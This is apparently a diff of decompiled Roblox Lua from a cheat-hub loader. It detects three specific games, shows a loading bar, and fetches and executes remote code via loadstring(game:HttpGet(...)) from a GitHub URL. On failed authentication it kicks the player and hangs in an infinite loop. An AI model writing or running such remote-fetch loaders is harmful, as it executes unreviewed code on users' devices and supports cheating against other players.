+            v49.Size = UDim2.new(- 0.982063651, 0, 0.0634071603, 0)
+            v49.Font = Enum.Font.RobotoMono
+            v49.Text = "Fun Fact:"
+            v49.TextColor3 = Color3.fromRGB(255, 255, 255)
+            v49.TextScaled = true
+            v49.TextSize = 14
+            v49.TextTransparency = 0.5
+            v49.TextWrapped = true
+            v33.Draggable = true
+            v49.Text = "Fun Fact: " .. v31()
+            print("UO 02")
+            v42.MouseButton1Click:Connect(function()
+                setclipboard("https://discord.gg/FDmwmrtSp2")
+                vu46.Visible = true
+                wait(1.5)
+                vu46.Visible = false
+            end)
+            if game.CreatorType == Enum.CreatorType.Group and 9950771 == game.CreatorId then
+                v32.Enabled = true
+                v40.Text = "Game Detected: Slap Battles"
+                wait(0.5)
+                local v50 = tick()
+                while tick() - v50 < 0.5 do
+                    game:GetService("TweenService"):Create(v35, TweenInfo.new(0.1), {
+                        Size = UDim2.new(v35.Size.X.Scale + 0.04, 0, 1, 0)
+                    }):Play()
+                    wait()
+                end
+                wait(1)
+                local v51 = tick()
+                while tick() - v51 < 0.6 do
+                    game:GetService("TweenService"):Create(v35, TweenInfo.new(0.1), {
+                        Size = UDim2.new(v35.Size.X.Scale + 0.01, 0, 1, 0)
+                    }):Play()
+                    wait()
+                end
+                getgenv().globalmainnacess = true
+                getgenv().dothefuckingkeysystem = true
+                getgenv().WWAC = "SB"
+                getgenv().bG9hZGtz = true
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/Skzuppy/forge-hub/main/KS_LOADER"))()
+            end
+            if game.PlaceId == 8542259458 or game.CreatorType == Enum.CreatorType.Group and 8154377 == game.CreatorId then
+                v32.Enabled = true
+                v40.Text = "Game Detected: Skywars"
+                wait(0.5)
+                local v52 = tick()
+                while tick() - v52 < 0.5 do
+                    game:GetService("TweenService"):Create(v35, TweenInfo.new(0.1), {
+                        Size = UDim2.new(v35.Size.X.Scale + 0.04, 0, 1, 0)
+                    }):Play()
+                    wait()
+                end
+                wait(1)
+                local v53 = tick()
+                while tick() - v53 < 0.6 do
+                    game:GetService("TweenService"):Create(v35, TweenInfo.new(0.1), {
+                        Size = UDim2.new(v35.Size.X.Scale + 0.01, 0, 1, 0)
+                    }):Play()
+                    wait()
+                end
+                getgenv().globalmainnacess = true
+                getgenv().dothefuckingkeysystem = true
+                getgenv().WWAC = "SW"
+                getgenv().bG9hZGtz = true
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/Skzuppy/forge-hub/main/KS_LOADER"))()
+            end
+            if game.PlaceId == 2653064683 or game.CreatorType == Enum.CreatorType.Group and 4585943 == game.CreatorId then
+                v32.Enabled = true
+                v40.Text = "Game Detected: Word Bomb"
+                wait(0.5)
+                local v54 = tick()
+                while tick() - v54 < 0.5 do
+                    game:GetService("TweenService"):Create(v35, TweenInfo.new(0.1), {
+                        Size = UDim2.new(v35.Size.X.Scale + 0.04, 0, 1, 0)
+                    }):Play()
+                    wait()
+                end
+                wait(1)
+                local v55 = tick()
+                while tick() - v55 < 0.6 do
+                    game:GetService("TweenService"):Create(v35, TweenInfo.new(0.1), {
+                        Size = UDim2.new(v35.Size.X.Scale + 0.01, 0, 1, 0)
+                    }):Play()
+                    wait()
+                end
+                getgenv().globalmainnacess = true
+                getgenv().dothefuckingkeysystem = true
+                getgenv().WWAC = "WB"
+                getgenv().bG9hZGtz = true
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/Skzuppy/forge-hub/main/KS_LOADER"))()
+            end
+        end
+    end
+    return
+else
+    game.Players.LocalPlayer:Kick("Failed to authenticate you! Please try again or make a ticket in https://discord.gg/FDmwmrtSp2")
+    wait(0.75)
+    while true do
+    end
+end
